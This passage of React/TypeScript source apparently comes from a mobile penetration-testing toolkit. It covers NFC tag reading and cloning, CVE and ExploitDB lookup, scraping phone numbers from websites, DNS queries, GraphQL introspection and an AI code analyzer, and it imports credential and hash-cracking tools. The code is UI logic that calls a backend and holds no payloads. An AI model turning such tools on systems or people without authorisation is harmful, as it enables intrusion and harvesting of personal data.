      setMessage(`Error: ${error.message}`);
      setScanning(false);
    }
  };

  const handleWrite = async () => {
    if (!writePayload) return;
    setWriting(true);
    setMessage('APPROACH TAG TO WRITE...');

    try {
      if (Capacitor.isNativePlatform()) {
        // Prepare NDEF message
        // Plugin usually takes payload as byte array or string depending on version
        // We'll attempt a common format for Capacitor NFC plugins
        await CapacitorNfc.write({
          ndefMessage: [{
            tnf: 1, // Well Known
            type: writeType === 'text' ? [0x54] : [0x55], // 'T' or 'U'
            payload: Array.from(new TextEncoder().encode(writePayload))
          }]
        });
        setMessage('WRITE SUCCESSFUL!');
      } else if ('NDEFReader' in window) {
        const ndef = new (window as any).NDEFReader();
        await ndef.write(writePayload);
        setMessage('WRITE SUCCESSFUL!');
      }
    } catch (e: any) {
      setMessage(`WRITE FAIL: ${e.message}`);
    } finally {
      setWriting(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <div className="flex gap-2 border-b border-white/5 pb-2 overflow-x-auto no-scrollbar">
           <button onClick={() => setActiveTab('read')} className={`px-4 py-2 text-[10px] font-bold tracking-widest uppercase transition-all ${activeTab === 'read' ? 'text-neon-green bg-neon-green/10 rounded-lg' : 'text-gray-500'}`}>READ MODE</button>
           <button onClick={() => setActiveTab('write')} className={`px-4 py-2 text-[10px] font-bold tracking-widest uppercase transition-all ${activeTab === 'write' ? 'text-neon-green bg-neon-green/10 rounded-lg' : 'text-gray-500'}`}>CLONE / WRITE</button>
        </div>

        {activeTab === 'read' ? (
          <div className="space-y-6 flex flex-col h-full">
            <div className="flex flex-col items-center justify-center p-10 border border-neon-green/20 bg-neon-green/5 rounded-3xl text-center relative overflow-hidden group">
               <div className={`w-20 h-20 rounded-full border-2 ${scanning ? 'border-neon-green animate-pulse' : 'border-neon-green/20'} flex items-center justify-center mb-6`}>
                  <Wifi size={32} className="text-neon-green rotate-90" />
               </div>
               <p className="text-[10px] text-gray-400 font-mono mb-8 uppercase tracking-widest max-w-[200px]">
                 {message || 'Ready to intercept NDEF proximity data packets.'}
               </p>
               <button
                 onClick={startScan} disabled={scanning}
                 className="w-full bg-neon-green text-black py-4 rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg shadow-neon-green/10 hover:bg-white transition-all disabled:opacity-50"
               >
                 {scanning ? 'SCANNING AIRWAVES...' : 'INITIALIZE INTERCEPT'}
               </button>
            </div>

            {records.length > 0 && (
               <div className="flex-1 bg-[#050505] rounded-2xl border border-white/5 p-4 space-y-3 overflow-auto max-h-[300px]">
                 <h3 className="text-[9px] font-bold text-gray-500 tracking-widest uppercase mb-2">Decoded NDEF records ({records.length})</h3>
                 {records.map((r, i) => (
                    <div key={i} className="bg-black/40 border border-neon-green/10 p-4 rounded-xl space-y-2">
                       <div className="flex justify-between items-center border-b border-white/5 pb-2">
                          <span className="text-neon-green font-bold text-[10px] uppercase">TYPE: {r.type}</span>
                          <Copy size={12} className="text-gray-600 hover:text-white cursor-pointer" onClick={() => copyToCb(r.data)} />
                       </div>
                       <p className="text-xs text-gray-300 font-mono break-all leading-relaxed">{r.data}</p>
                    </div>
                 ))}
               </div>
            )}
          </div>
        ) : (
          <div className="space-y-6 animate-in fade-in slide-in-from-bottom-2">
            <div className="bg-black/50 border border-white/5 p-6 rounded-3xl space-y-6">
               <div className="space-y-2">
                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Data Structure</label>
                  <div className="flex gap-2">
                     <button onClick={() => setWriteTab('text')} className={`flex-1 py-2 text-[9px] font-bold rounded-lg border transition-all ${writeType === 'text' ? 'border-neon-green text-neon-green bg-neon-green/5' : 'border-white/10 text-gray-600'}`}>TEXT RECORD</button>
                     <button onClick={() => setWriteTab('uri')} className={`flex-1 py-2 text-[9px] font-bold rounded-lg border transition-all ${writeType === 'uri' ? 'border-neon-green text-neon-green bg-neon-green/5' : 'border-white/10 text-gray-600'}`}>URI / LINK</button>
                  </div>
               </div>

               <div className="space-y-2">
                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Payload Content</label>
                  <textarea
                    value={writePayload} onChange={e => setWritePayload(e.target.value)}
                    placeholder={writeType === 'text' ? 'Enter text message...' : 'https://pwnnet.toolkit'}
                    className="w-full bg-[#050505] border border-white/10 rounded-2xl p-4 text-xs text-neon-green font-mono h-32 focus:border-neon-green/50 outline-none"
                  />
               </div>

               <button
                 onClick={handleWrite} disabled={writing || !writePayload}
                 className="w-full bg-red-500/10 text-red-500 border border-red-500/30 py-4 rounded-2xl font-black uppercase text-xs tracking-widest hover:bg-red-500 hover:text-white transition-all disabled:opacity-30"
               >
                 {writing ? 'WRITING TO SECTOR...' : 'COMMIT TO TAG'}
               </button>

               {message && (
                 <div className="p-3 bg-black border border-white/5 rounded-xl text-center">
                    <p className="text-[9px] text-neon-green font-bold uppercase tracking-tighter">{message}</p>
                 </div>
               )}
            </div>

            <div className="p-4 bg-yellow-500/5 border border-yellow-500/20 rounded-2xl">
               <p className="text-[9px] text-yellow-500/80 font-mono leading-relaxed uppercase">
                 <VaultShield size={10} className="inline mr-1 mb-0.5" />
                 SECURITY NOTICE: NDEF Writing overwrites sector 0. Ensure target tag is rewritable and not locked by manufacturer password.
               </p>
            </div>
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

let cachedRecentCves: any[] | null = null;
let cveFetchPromise: Promise<any> | null = null;

const prefetchCves = () => {
  if (cachedRecentCves) return Promise.resolve(cachedRecentCves);
  if (!cveFetchPromise) {
    const backendUrl = getBackendUrl();
    cveFetchPromise = fetch(`${backendUrl}/api/net/cve/recent`)
      .then(r => r.json())
      .then(d => {
         let data = [];
         if (d && d.vulnerabilities && Array.isArray(d.vulnerabilities)) {
            data = d.vulnerabilities;
         } else if (Array.isArray(d)) {
            data = d.slice(0, 15);
         }
         cachedRecentCves = data;
         return data;
      })
      .catch(() => {
         cveFetchPromise = null;
         return [];
      });
  }
  return cveFetchPromise;
};

// Pre-fetch immediately
setTimeout(prefetchCves, 1000);

export function CveTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: cveId, setValue: setCveId, handleKeyDown, saveToHistory } = useInputHistory('');
  const [data, setData] = useState<any>(null);
  const [recentCves, setRecentCves] = useState<any[]>(cachedRecentCves || []);
  const [loading, setLoading] = useState(false);
  const [loadingMore, setLoadingMore] = useState(false);
  const [error, setError] = useState('');
  const [startIndex, setStartIndex] = useState(cachedRecentCves?.length || 0);
  const [showDiag, setShowDiag] = useState(false);

  const fetchRecent = async (index = 0) => {
    if (index === 0 && cachedRecentCves && cachedRecentCves.length > 0) {
       return;
    }

    if (index === 0) setLoading(true);
    else setLoadingMore(true);

    setError('');
    try {
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/cve/recent?startIndex=${index}`);
      if (!res.ok) {
        const errJson = await res.json().catch(() => ({}));
        throw new Error(errJson.details || errJson.error || `Server error ${res.status}`);
      }
      const json = await res.json();

      if (json.vulnerabilities) {
        if (index === 0) {
           setRecentCves(json.vulnerabilities);
           cachedRecentCves = json.vulnerabilities;
        } else {
           setRecentCves(prev => [...prev, ...json.vulnerabilities]);
        }
        setStartIndex(index + json.vulnerabilities.length);
      }
    } catch (e: any) {
      if (recentCves.length === 0) {
        setError(`DATABASE SYNC FAIL: ${e.message}. Ensure backend is live at ${getBackendUrl()}`);
      }
    } finally {
      setLoading(false);
      setLoadingMore(false);
    }
  };

  useEffect(() => {
    if (recentCves.length === 0) {
       prefetchCves().then(data => {
         if (data && data.length > 0) {
           setRecentCves(data);
           setStartIndex(data.length);
         } else {
           fetchRecent(0);
         }
       });
    }
  }, []);

  const searchCve = async (idToSearch?: string) => {
    const targetId = idToSearch || cveId;
    if (!targetId) return;
    (document.activeElement as HTMLElement)?.blur();
    if (!idToSearch) saveToHistory();
    setLoading(true);
    setError('');
    setData(null);
    try {
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/cve/search?id=${encodeURIComponent(targetId)}`);
      if (!res.ok) {
        const errJson = await res.json().catch(() => ({}));
        throw new Error(errJson.error || `CVE not found or API error (${res.status})`);
      }
      const json = await res.json();
      if (!json || !json.data) throw new Error('CVE not found');
      setData({ fallback: json.fallback, data: json.data });
    } catch(e: any) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <div className="flex justify-between items-center">
          <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block">
            {recentCves.length > 0 && !data ? 'RECENT CVEs & SEARCH' : 'CVE DATABASE SEARCH'}
          </label>
          <button onClick={() => setShowDiag(!showDiag)} className="text-[9px] text-gray-600 hover:text-neon-green transition-colors uppercase font-mono">
            [Backend Info]
          </button>
        </div>

        {showDiag && (
           <div className="p-3 border border-white/10 bg-black/50 rounded-lg text-[9px] font-mono text-gray-500 break-all">
              ENDPOINT: {getBackendUrl()}/api/net/cve/recent<br/>
              PLATFORM: {Capacitor.getPlatform()}<br/>
              NATIVE: {Capacitor.isNativePlatform() ? 'YES' : 'NO'}<br/>
              CACHE: {recentCves.length} items
           </div>
        )}

        <div className="flex flex-col sm:flex-row gap-3 p-1">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={cveId}
            onChange={e => setCveId(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="e.g. CVE-2024-1234"
           onClear={() => setCveId('')} />
          <button
            onClick={() => searchCve()}
            disabled={loading}
            className="shrink-0 bg-neon-green/10 text-neon-green border border-neon-green/30 px-6 py-4 sm:py-0 rounded-xl text-xs font-bold uppercase tracking-wider hover:bg-neon-green hover:text-black transition-all disabled:opacity-50 whitespace-nowrap"
          >
            {loading && !loadingMore ? '...' : 'FIND'}
          </button>
        </div>

        {error && (
          <div className="p-4 border border-red-500/30 text-red-500 bg-red-500/10 rounded-xl text-xs flex flex-col gap-2">
            <p>{error}</p>
            {recentCves.length === 0 && (
              <button onClick={() => fetchRecent(0)} className="underline text-left font-bold hover:text-white transition-colors">
                RETRY CONNECTION
              </button>
            )}
          </div>
        )}

        {!data && !error && (
          <div className="flex-1 flex flex-col overflow-hidden bg-[#050505] rounded-xl border border-neon-green/20">
             <div className="flex-1 overflow-auto p-4 scrollbar-thin scrollbar-thumb-neon-green/20">
               <h3 className="text-xs font-bold text-gray-500 tracking-widest uppercase mb-4">Most Recent Vulnerabilities</h3>
               {loading && startIndex === 0 ? (
                 <div className="flex flex-col items-center justify-center py-10 gap-3">
                    <div className="w-6 h-6 border-2 border-neon-green/20 border-t-neon-green rounded-full animate-spin" />
                    <div className="text-neon-green text-[10px] animate-pulse uppercase font-mono tracking-widest">Synchronizing Global Database...</div>
                 </div>
               ) : (
                 <div className="space-y-4">
                    {recentCves.map((cve, i) => (
                      <div key={i} className="border-b border-neon-green/10 pb-4 last:border-0 cursor-pointer hover:bg-neon-green/5 p-2 rounded transition-all group" onClick={() => searchCve(cve.id)}>
                         <div className="flex items-center justify-between mb-1">
                            <span className="text-neon-green font-bold text-xs group-hover:text-white transition-colors">{cve.id}</span>
                            {cve.cvss && <span className="text-[9px] bg-red-500/20 text-red-400 px-2 py-0.5 rounded border border-red-500/30">CVSS: {cve.cvss}</span>}
                         </div>
                         <p className="text-gray-400 text-[10px] line-clamp-2 leading-relaxed">{cve.summary}</p>
                      </div>
                    ))}

                    <button
                      onClick={() => fetchRecent(startIndex)}
                      disabled={loadingMore}
                      className="w-full py-4 mt-2 border border-neon-green/20 rounded-lg text-neon-green text-[10px] font-bold uppercase tracking-widest hover:bg-neon-green/5 transition-all disabled:opacity-50"
                    >
                      {loadingMore ? 'FETCHING DATA...' : 'LOAD NEXT 20 CVEs'}
                    </button>
                 </div>
               )}
             </div>
          </div>
        )}

        {data && (
          <div className="flex-1 overflow-auto bg-[#050505] p-4 rounded-xl border border-neon-green/20 scrollbar-thin scrollbar-thumb-neon-green/20">
            <h3 className="text-neon-green font-bold text-lg mb-4">
              {data.fallback ? data.data.id : (data.data.cveMetadata?.cveId || 'CVE DETAILS')}
            </h3>

            {data.fallback ? (
              <div className="space-y-4 text-xs font-mono">
                 <div className="text-gray-400">
                    <span className="text-gray-500 font-bold">SUMMARY:</span><br/>
                    <span className="text-gray-300">{data.data.summary}</span>
                 </div>
                 <div className="text-gray-400">
                    <span className="text-gray-500 font-bold">PUBLISHED:</span> {data.data.Published}
                 </div>
                 {data.data.cvss && (
                   <div className="text-gray-400">
                      <span className="text-gray-500 font-bold">CVSS:</span> <span className="text-red-400">{data.data.cvss}</span>
                   </div>
                 )}
                 {data.data.references && data.data.references.length > 0 && (
                   <div className="text-gray-400 mt-4">
                     <span className="text-gray-500 font-bold block mb-2">REFERENCES:</span>
                     <ul className="list-disc pl-4 space-y-1">
                       {data.data.references.slice(0,10).map((r: string, i: number) => (
                         <li key={i}><button onClick={() => openExternalLink(r)} className="text-neon-green/80 hover:underline hover:text-neon-green break-all text-left">{r}</button></li>
                       ))}
                     </ul>
                   </div>
                 )}
              </div>
            ) : (
              <div className="space-y-4 text-xs font-mono">
                {data.data.containers?.cna?.descriptions?.map((desc: any, idx: number) => (
                  <div key={idx} className="text-gray-400">
                    <span className="text-gray-500 font-bold block mb-2">DESCRIPTION:</span>
                    <span className="text-gray-200">{desc.value}</span>
                  </div>
                ))}

                <div className="text-gray-400">
                  <span className="text-gray-500 font-bold">STATE:</span>{' '}
                  <span className={data.data.cveMetadata?.state === 'PUBLISHED' ? 'text-neon-green' : 'text-yellow-500'}>
                    {data.data.cveMetadata?.state || 'UNKNOWN'}
                  </span>
                </div>

                {data.data.containers?.cna?.metrics?.[0]?.cvssV3_1 && (
                  <div className="text-gray-400">
                    <span className="text-gray-500 font-bold">CVSS v3.1 BASE SCORE:</span>{' '}
                    <span className="text-red-500 font-bold">{data.data.containers.cna.metrics[0].cvssV3_1.baseScore}</span>
                    {' '}({data.data.containers.cna.metrics[0].cvssV3_1.baseSeverity})
                  </div>
                )}

                {data.data.containers?.cna?.metrics?.[0]?.cvssV3_0 && (
                  <div className="text-gray-400">
                    <span className="text-gray-500 font-bold">CVSS v3.0 BASE SCORE:</span>{' '}
                    <span className="text-red-500 font-bold">{data.data.containers.cna.metrics[0].cvssV3_0.baseScore}</span>
                    {' '}({data.data.containers.cna.metrics[0].cvssV3_0.baseSeverity})
                  </div>
                )}

                {data.data.containers?.cna?.affected && (
                  <div className="text-gray-400 mt-4">
                    <span className="text-gray-500 font-bold block mb-2">AFFECTED PRODUCTS:</span>
                    <ul className="list-disc pl-4 space-y-2">
                      {data.data.containers.cna.affected.map((a: any, i: number) => (
                        <li key={i}>
                          <span className="text-neon-green">{a.vendor}</span> {a.product}
                          {a.versions && (
                            <div className="text-gray-500 mt-1">
                              Versions: {a.versions.map((v: any) => v.version).join(', ')}
                            </div>
                          )}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                {data.data.containers?.cna?.references && (
                  <div className="text-gray-400 mt-4">
                    <span className="text-gray-500 font-bold block mb-2">REFERENCES:</span>
                    <ul className="list-disc pl-4 space-y-1">
                      {data.data.containers.cna.references.map((ref: any, i: number) => (
                        <li key={i}>
                          <button onClick={() => openExternalLink(ref.url)} className="text-neon-green/80 hover:underline hover:text-neon-green break-all text-left">
                            {ref.url}
                          </button>
                        </li>
                      ))}
                    </ul>
                  </div>
                )}
              </div>
            )}

            <button
               onClick={() => setData(null)}
               className="mt-4 text-xs text-gray-500 hover:text-white"
            >
               ← BACK TO RECENT / SEARCH
            </button>
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

export function PhoneCrawlTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: url, setValue: setUrl, handleKeyDown, saveToHistory } = useInputHistory('https://example.com/contact');
  const [phones, setPhones] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const crawl = async () => {
    if (!url.trim() || !/^https?:\/\//i.test(url.trim())) {
      setError('Please enter a valid URL starting with http:// or https://');
      return;
    }
    (document.activeElement as HTMLElement)?.blur();
    saveToHistory();
    setLoading(true);
    setError('');
    setPhones([]);
    try {
      const qs = new URLSearchParams({ target: url }).toString();
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/phonecrawl?${qs}`);
      const data = await res.json();

      if (!res.ok) throw new Error(data.error || 'Crawl failed.');

      if (data.numbers) {
        setPhones(data.numbers);
      } else {
        setPhones([]);
      }
    } catch (e: any) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <div className="flex flex-col sm:flex-row gap-3 p-1">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={url}
            onChange={e => setUrl(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="target url..."
           onClear={() => setUrl('')} />
          <button
            onClick={crawl}
            disabled={loading}
            className="shrink-0 bg-neon-green/10 text-neon-green border border-neon-green/30 px-6 py-4 sm:py-0 rounded-xl text-xs font-bold uppercase tracking-wider hover:bg-neon-green hover:text-black transition-all disabled:opacity-50 whitespace-nowrap"
          >
            {loading ? '...' : 'CRAWL'}
          </button>
        </div>

        {error && <div className="text-red-500 border border-red-500/20 bg-red-500/5 p-4 rounded-xl text-xs uppercase">{error}</div>}

        <div className="flex-1 border border-neon-green/20 rounded-xl bg-[#050505] p-4 font-mono relative">
          {phones.length > 0 && (
            <button onClick={() => setPhones([])} className="absolute top-4 right-4 bg-black hover:bg-neon-green/10 border border-red-500/30 text-gray-400 hover:text-red-400 px-3 py-1.5 rounded text-[10px] font-bold uppercase tracking-widest transition-all">Clear</button>
          )}
          {!loading && phones.length === 0 && !error && <div className="text-gray-500 text-xs">No phone numbers found or waiting to crawl.</div>}
          {loading && <div className="text-neon-green text-xs animate-pulse">Crawling DOM and extracting patterns...</div>}
          <div className="mt-8">
            {phones.map((p, i) => (
               <div key={i} className="text-neon-green mb-2 text-sm flex items-center justify-between">
                  <div>&rsaquo; {p}</div>
                  <CopyButton text={p} />
               </div>
            ))}
          </div>
        </div>
      </div>
    </CustomToolLayout>
  );
}


export function DnsTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: target, setValue: setTarget, handleKeyDown, saveToHistory } = useInputHistory('example.com');
  const [server, setServer] = useState('default');
  const [reverse, setReverse] = useState(false);
  const [loading, setLoading] = useState(false);
  const [output, setOutput] = useState('');

  const servers = [
    { label: 'System Default', ip: 'default' },
    { label: 'Google (8.8.8.8)', ip: '8.8.8.8' },
    { label: 'Cloudflare (1.1.1.1)', ip: '1.1.1.1' },
    { label: 'Quad9 (9.9.9.9)', ip: '9.9.9.9' },
    { label: 'OpenDNS (208.67.222.222)', ip: '208.67.222.222' }
  ];

  const fetchDns = async () => {
    if (!target) return;
    (document.activeElement as HTMLElement)?.blur();
    saveToHistory();
    setLoading(true);
    setOutput('');
    try {
      const qs = new URLSearchParams({ target, server, reverse: reverse.toString() }).toString();
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/dns?${qs}`);
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Request failed');
      setOutput(data.result);
    } catch (e: any) {
      setOutput(`Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-4 block">
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={target}
            onChange={e => setTarget(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="target domain or IP..."
           onClear={() => setTarget('')} />
          <button
            onClick={fetchDns}
            disabled={loading || !target}
            className={`flex-1 sm:flex-initial px-6 py-4 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${loading || !target ? 'bg-neon-green/5 text-neon-green/50 border border-neon-green/20 cursor-not-allowed' : 'bg-neon-green text-black hover:bg-neon-green hover:shadow-[0_0_15px_rgba(57,255,20,0.4)]'}`}
          >
            {loading ? 'QUERYING...' : 'RESOLVE'}
          </button>
        </div>

        <div className="flex flex-col sm:flex-row gap-3">
          <select
            value={server}
            onChange={e => setServer(e.target.value)}
            className="flex-1 bg-[#050505] border border-neon-green/20 focus:border-neon-green rounded-xl p-3 text-neon-green font-mono text-xs outline-none transition-all appearance-none"
          >
            {servers.map(s => <option key={s.ip} value={s.ip}>{s.label}</option>)}
          </select>

          <button
            onClick={() => setReverse(r => !r)}
            className={`px-4 py-3 border rounded-xl text-xs font-bold tracking-widest transition-all ${reverse ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-neon-green/20 text-gray-400 hover:border-neon-green/50'}`}
          >
            REVERSE LOOKUP {reverse ? '(ON)' : '(OFF)'}
          </button>
        </div>

        <div className="bg-[#050505] border border-neon-green/20 rounded-xl p-4 min-h-[200px] overflow-auto relative mt-2">
          {output && (
            <button onClick={() => setOutput('')} className="absolute top-2 right-2 bg-black hover:bg-neon-green/10 border border-red-500/30 text-gray-400 hover:text-red-400 px-3 py-1.5 rounded text-[9px] font-bold uppercase tracking-widest transition-all">Clear</button>
          )}
          {output ? (
            <pre className="text-neon-green/80 text-[10px] sm:text-xs font-mono whitespace-pre-wrap mt-6">{output}</pre>
          ) : (
             <div className="text-gray-500 text-xs text-center mt-10">ENTER A TARGET TO VIEW DNS RECORDS.</div>
          )}
        </div>
      </div>
    </CustomToolLayout>
  );
}

import { 
  DirScannerTool, 
  SpiderTool, 
  ReactScannerTool, 
  WpScannerTool, 
  NetScannerTool, 
  WhoisTool 
} from './ScannerTools';

import {
  DefaultCredsTool,
  HashCrackerTool
} from './PasswordAuditor';

export function ExploitdbTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: keyword, setValue: setKeyword, handleKeyDown, saveToHistory } = useInputHistory('');
  const [data, setData] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const searchExamples = [
    "WordPress", "Log4j", "Windows", "Remote Code Execution", "SQL Injection", "Local Privilege Escalation", "Buffer Overflow"
  ];

  const searchExploits = async (q?: string) => {
    const term = q || keyword;
    if (!term) return;
    (document.activeElement as HTMLElement)?.blur();
    if (!q) saveToHistory();
    setLoading(true);
    setError('');
    setData([]);
    try {
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/exploitdb/search?q=${encodeURIComponent(term)}`);
      if (!res.ok) throw new Error('Failed to fetch exploits');
      const json = await res.json();
      if (!json || !json.data) throw new Error('No exploits found');
      if (json.data.length === 0) setError('No exploits found.');
      setData(json.data);
    } catch(e: any) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block">
          EXPLOITDB SEARCH
        </label>

        <div className="flex flex-wrap gap-2 mb-2">
          {searchExamples.map(ex => (
            <button
              key={ex}
              onClick={() => { setKeyword(ex); searchExploits(ex); }}
              className="px-3 py-1 bg-neon-green/5 border border-neon-green/20 rounded text-[10px] text-neon-green/70 hover:bg-neon-green/10 hover:text-neon-green transition-all uppercase font-bold"
            >
              {ex}
            </button>
          ))}
        </div>

        <div className="flex flex-col sm:flex-row gap-3 p-1">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={keyword}
            onChange={e => setKeyword(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="e.g. WordPress, CVE-2024-1234"
           onClear={() => setKeyword('')} />
          <button
            onClick={() => searchExploits()}
            disabled={loading || !keyword}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 hover:bg-neon-green hover:text-black transition-all px-6 py-4 rounded-xl font-bold uppercase tracking-widest text-xs disabled:opacity-50"
          >
            {loading ? 'SEARCHING...' : 'FIND'}
          </button>
        </div>

        {error && (
          <div className="p-4 border border-red-500/30 text-red-500 bg-red-500/10 rounded-xl text-xs">
            {error}
          </div>
        )}

        {data.length > 0 && (
          <div className="flex-1 overflow-auto bg-[#050505] p-4 rounded-xl border border-neon-green/20 scrollbar-thin scrollbar-thumb-neon-green/20">
            <h3 className="text-xs font-bold text-gray-500 tracking-widest uppercase mb-4">Results ({data.length})</h3>
            <div className="space-y-4">
              {data.map((exp, i) => (
                <div key={i} className="border-b border-neon-green/10 pb-4 last:border-0 p-2 rounded transition-all">
                   <div className="flex items-center justify-between mb-1 gap-2">
                      <span className="text-neon-green font-bold text-xs">{exp.description}</span>
                      <a href={exp.url} target="_blank" rel="noopener noreferrer" className="text-xs bg-neon-green/20 text-neon-green px-2 py-0.5 rounded border border-neon-green/30 hover:bg-neon-green hover:text-black transition-colors font-bold whitespace-nowrap">VIEW EDB-{exp.id}</a>
                   </div>
                   <div className="flex flex-wrap gap-4 mt-2">
                     <p className="text-gray-400 text-[10px]">Type: {exp.type}</p>
                     <p className="text-gray-400 text-[10px]">Platform: {exp.platform}</p>
                     <p className="text-gray-400 text-[10px]">Author: {exp.author}</p>
                   </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

export function GraphqlTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: url, setValue: setUrl, handleKeyDown, saveToHistory } = useInputHistory('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<string>('');

  const scan = async () => {
    if(!url) return;
    setLoading(true);
    setResult('Testing common GraphQL paths (/graphql, /api/graphql, /v1/graphql)...');
    try {
      const baseUrl = getBackendUrl();
      const res = await fetch(`${baseUrl}/api/net/graphql_scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target: url })
      });
      const data = await res.json();
      if (res.ok) {
        setResult(data.result || 'No response data.');
      } else {
        setResult(`Error: ${data.error || 'Failed to perform GraphQL introspection.'}`);
      }
    } catch (e: any) {
      setResult(`Connection Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block">GRAPHQL INSPECTOR</label>
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={url}
            onChange={e => setUrl(e.target.value)}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="target url (e.g. https://api.example.com)"
            onClear={() => setUrl('')}
          />
          <button
            onClick={scan}
            disabled={loading || !url}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 hover:bg-neon-green hover:text-black transition-all px-6 py-4 rounded-xl font-bold uppercase tracking-widest text-xs disabled:opacity-50"
          >
            {loading ? 'SCANNING...' : 'INTROSPECT'}
          </button>
        </div>

        <div className="flex-1 border border-neon-green/20 bg-[#050505] rounded-xl p-4 overflow-auto scrollbar-thin scrollbar-thumb-neon-green/20">
          <pre className="text-xs font-mono text-neon-green/80 whitespace-pre-wrap">
            {result || 'Waiting for target URL...'}
          </pre>
        </div>
      </div>
    </CustomToolLayout>
  );
}

export function AiTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: code, setValue: setCode, handleKeyDown, saveToHistory } = useInputHistory('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<string>('');

  const analyze = async () => {
    if(!code) return;
    setLoading(true);
    setResult('Contacting AI Core for analysis...');
    try {
      const baseUrl = getBackendUrl();
      const res = await fetch(`${baseUrl}/api/net/ai_analyze`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code })
      });
      const data = await res.json();
      if (res.ok) {
        setResult(data.result || 'No output generated.');
      } else {
        setResult(`Vulnerability Analysis Error: ${data.error || 'Check API configurations on the server.'}`);
      }
    } catch(e: any) {
      setResult(`Connection Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block">AI VULNERABILITY ANALYZER</label>

        <textarea
            value={code}
            onChange={e => setCode(e.target.value)}
            onKeyDown={handleKeyDown}
            onBlur={() => saveToHistory()}
            className="h-48 bg-[#050505] border border-neon-green/20 focus:border-neon-green rounded-xl p-4 text-neon-green font-mono text-xs outline-none transition-all resize-none"
            placeholder="Paste code snippet, minified JS, or HTTP request to analyze..."
          />

        <button
            onClick={analyze}
            disabled={loading || !code}
            className="w-full bg-neon-green text-black hover:bg-white hover:shadow-[0_0_15px_rgba(255,255,255,0.4)] transition-all px-6 py-4 rounded-xl font-bold uppercase tracking-widest text-xs disabled:opacity-50"
          >
            {loading ? 'ANALYZING NEURAL NET...' : 'ANALYZE SNIPPET'}
          </button>

        <div className="border border-neon-green/20 bg-[#050505] rounded-xl p-4 overflow-auto min-h-[150px] scrollbar-thin scrollbar-thumb-neon-green/20">
